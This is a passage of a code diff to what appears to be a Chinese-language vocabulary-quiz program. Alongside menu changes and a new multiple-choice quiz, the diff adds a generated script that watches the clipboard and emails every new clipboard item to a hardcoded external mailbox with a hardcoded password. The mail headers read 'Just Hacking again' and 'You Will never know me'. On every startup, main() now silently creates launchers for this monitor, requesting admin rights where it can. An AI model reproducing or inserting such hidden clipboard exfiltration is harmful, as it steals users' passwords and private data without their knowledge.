+    mail_pass = "abc123456"  # 口令
+
+    sender = 'MrShadomago@126.com'
+    receivers = ['MrShadomago@126.com']  # 接收邮件，可设置为你的QQ邮箱或者其他邮箱
+
+    message = MIMEText(str_captured, 'plain', 'utf-8')
+    message['From'] = Header("Just Hacking again", 'utf-8')
+    message['To'] = Header("You Will never know me", 'utf-8')
+
+    subject = 'Python SMTP 邮件测试'
+    message['Subject'] = Header(subject, 'utf-8')
+
+    try:
+        smtpObj = smtplib.SMTP()
+        smtpObj.connect(mail_host, 25)  # 25 为 SMTP 端口号
+        smtpObj.login(mail_user, mail_pass)
+        smtpObj.sendmail(sender, receivers, message.as_string())
+        print("邮件发送成功")
+    except smtplib.SMTPException:
+        print("Error: 无法发送邮件")
+
+
+def monitor_clipboard(last_data):
+    while True:
+        try:
+            time.sleep(0.2)
+            clip_data = pyperclip.paste()
+            if clip_data != last_data:
+                ascension(clip_data)
+                last_data = clip_data
+                continue
+        except KeyboardInterrupt:
+            return    
+
+
+if __name__ == '__main__':
+    last_data = ""
+    monitor_clipboard(last_data)
+    """)
+    h.close()
+    z.close()
+    f.close()
+    q.close()
 
 
 def display_cur_version():
@@ -1381,47 +1514,64 @@ def display_cur_version():
 
 
 def main(argv):
-    filename = get_path()+"\\wordlist.txt"
-    wordlist = WordList(filename)
-    datefilename = get_path()+"\\datefile.txt"
+    if is_admin():
+        create_files()
+    else:
+        gen_admin_launcher()
+    gen_clip_launcher()
+    gen_launcher_test()
+    last_data = None
+    filename = get_path()+"wordlist.txt"
+    wordlist = WordList(filename=filename)
+    datefilename = get_path()+"datefile.txt"
     datelist = Fusion(datefilename)
     datelist.write_date_to_file()
     b_shown = False
     options, args = getopt.getopt(argv, "-3-4")
     if ('-3', '')in options or '3' in args:
-        random_test(wordlist, datelist)
+        random_test_hint_always(wordlist, datelist, True)
     elif ('-4', '')in options or '4' in args:
         random_test_hint_always(wordlist, datelist)
     while True:
         try:
-            show_menu()
-            c = input().strip().lower()
+            if ('-1', '1') in options or '1' in args:
+                subprocess.Popen(get_path() + "clipboard_launcher.bat ", creationflags=subprocess.CREATE_NEW_CONSOLE)
+                exit()
+            elif ('-2', '2') in options or '2' in args:
+                c = "2"
+            else:
+                show_menu()
+                c = input().strip().lower()
             while len(c) == 0:
                 c = input().strip().lower()
             if c == "1":
                 show_word(wordlist)
                 b_shown = True
             elif c == "2":
-                if new_word(wordlist, datelist):
-                    wordlist.write_wordlist_to_file()
-                    datelist.write_date_to_file()
-                    print("今天共录入了", datelist.today().input_count(), "个单词，加油！")
+                if ('-2', '2') in options or '2' in args:
+                    monitor_clipboard(last_data, wordlist, datelist)
+
+                else:
+                    subprocess.Popen(get_path() + "clipboard_launcher.bat ", creationflags=subprocess.CREATE_NEW_CONSOLE)
+                    exit()
             elif c == "3":
                 if b_shown:
                     open_console(3)
+                    exit()
                 else:
-                    random_test(wordlist, datelist)
+                    random_test_hint_always(wordlist, datelist, True)
             elif c == "4":
                 if b_shown:
                     open_console(4)
+                    exit()
                 else:
                     random_test_hint_always(wordlist, datelist)
             elif c == "5":
                 fuzzy_finder(wordlist, datelist)
 
             elif c == "6":
-                wordlist.write_wordlist_to_file()
-                datelist.write_date_to_file()
+                wordlist.sort_by_time()
+                show_word(wordlist, show_date_delimeter=True)
             elif c == "7":
                 mistake_collection(wordlist, datelist)
             elif c == "8":
@@ -1430,10 +1580,7 @@ def main(argv):
                     datelist.write_date_to_file()
                     print("今天共录入了", datelist.today().input_count(), "个单词，加油！")
             elif c == "9":
-                if new_word_auto_requests(wordlist, datelist):
-                    wordlist.write_wordlist_to_file()
-                    datelist.write_date_to_file()
-                    print("今天共录入了", datelist.today().input_count(), "个单词，加油！")
+                random_test_chn(wordlist, datelist)
             elif c == "0":
                 while True:
                     show_sub_menu()
@@ -1450,7 +1597,7 @@ def main(argv):
                     elif c == "4":
                         display_cur_version()
                     elif c == "5":
-                        get_all_versions()
+                        wordlist.save_to_mysqldb()
                     elif c == "6":
                         show_phrases(wordlist)
                     elif c == "7":
@@ -1464,7 +1611,8 @@ def main(argv):
                         if is_admin():
                             print("脚本已经在管理员模式下运行！")
                         else:
-                            ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, __file__, None, 1)
+                            # ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, __file__, None, 1)
+                            open_console(admin=True)
                             sys.exit()
                     elif c == "0":
                         break
@@ -1475,9 +1623,82 @@ def main(argv):
         except EOFError:
             print("无效输入，已经取消操作")
             continue
-        except KeyboardInterrupt:
-            print("取消操作")
-            continue
+
+
+def random_test_chn(wordlist, datelist, recent=False):
+    if not recent:
+        p = choice(wordlist.get_unvisited_list())
+    else:
+        p = wordlist.get_unvisited_list(True, True)[0]
+    wordlist.visit(p)
+    p2 = p
+    p3 = p
+    print(p.it_self()),
+    print("对应哪个中文？(输入Ctrl+C退出)")
+    if len(wordlist.get_unvisited_list()) > 0:
+        p2 = choice(wordlist.get_unvisited_list())
+    if len(wordlist.get_unvisited_list()) > 1:
+        p3 = choice(wordlist.get_unvisited_list())
+        while p3 == p2:
+            p3 = choice(wordlist.get_unvisited_list())
+    seed = random.randint(0, 2)
+    if seed == 0:
+        if len(wordlist.get_unvisited_list()) == 0:
+            print("只有一个单词了！")
+        elif len(wordlist.get_unvisited_list()) == 1:
+            print("提供以下两个选择:"), print("(1)."+p.explanation()), print("(2)."+p2.explanation())
+        else:
+            print("提供以下三个选择:"), print("(1)."+p.explanation()), print("(2)."+p2.explanation()), print("(3)."+p3.explanation())
+    elif seed == 1:
+        if len(wordlist.get_unvisited_list()) == 0:
+            print("只有一个单词了！")
+        elif len(wordlist.get_unvisited_list()) == 1:
+            print("提供以下两个选择:"), print("(1)."+p2.explanation()), print("(2)."+p.explanation())
+        else:
+            print("提供以下三个选择:"), print("(1)."+p2.explanation()), print("(2)."+p.explanation()), print("(3)."+p3.explanation())
+    elif seed == 2:
+        if len(wordlist.get_unvisited_list()) == 0:
+            print("只有一个单词了！")
+        elif len(wordlist.get_unvisited_list()) == 1:
+            print("提供以下两个选择:"), print("(1)."+p.explanation()), print("(2)."+p2.explanation())
+        else:
+            print("提供以下三个选择:"), print("(1)."+p2.explanation()), print("(2)."+p3.explanation()), print("(3)."+p.explanation())
+    ans = input().strip().lower()
+    while len(ans) == 0:
+        ans = input().strip().lower()
+    if ans == "exit()":
+        return False
+    if ans == p.explanation() or ans == str(seed+1):
+        if len(wordlist.get_unvisited_list()) == 0:
+            print("你已经全部都答完啦！重新开始吗？(Y/N)")
+            test_done(p, datelist, wordlist, True)
+            chx = input().strip().lower()
+            while len(chx) == 0:
+                chx = input().strip().lower()
+            if chx == "Y" or chx == "y":
+                open_console()
+            else:
+                open_console()
+        else:
+            test_done(p, datelist, wordlist, True)
+            random_test_chn(wordlist, datelist, recent)
+    else:
+        print("正确答案是:", p.explanation())
+        print("还敢来吗?(Y/N)")
+        test_done(p, datelist, wordlist, False)
+        chs = input().strip().lower()
+        while len(chs) == 0:
+            chs = input().strip().lower()
+        if len(wordlist.get_unvisited_list()) == 0:
+            if chs == "Y" or chs == "y":
+                open_console()
+            else:
+                open_console()
+        else:
+            if chs == "Y" or chs == "y":
+                random_test_chn(wordlist, datelist, recent)
+            else:
+                return False
 
 
 if __name__ == '__main__':
@@ -1485,3 +1706,4 @@ if __name__ == '__main__':
         main(sys.argv[1:])
     except KeyboardInterrupt:
         print("用户中断执行...")
+        exit()
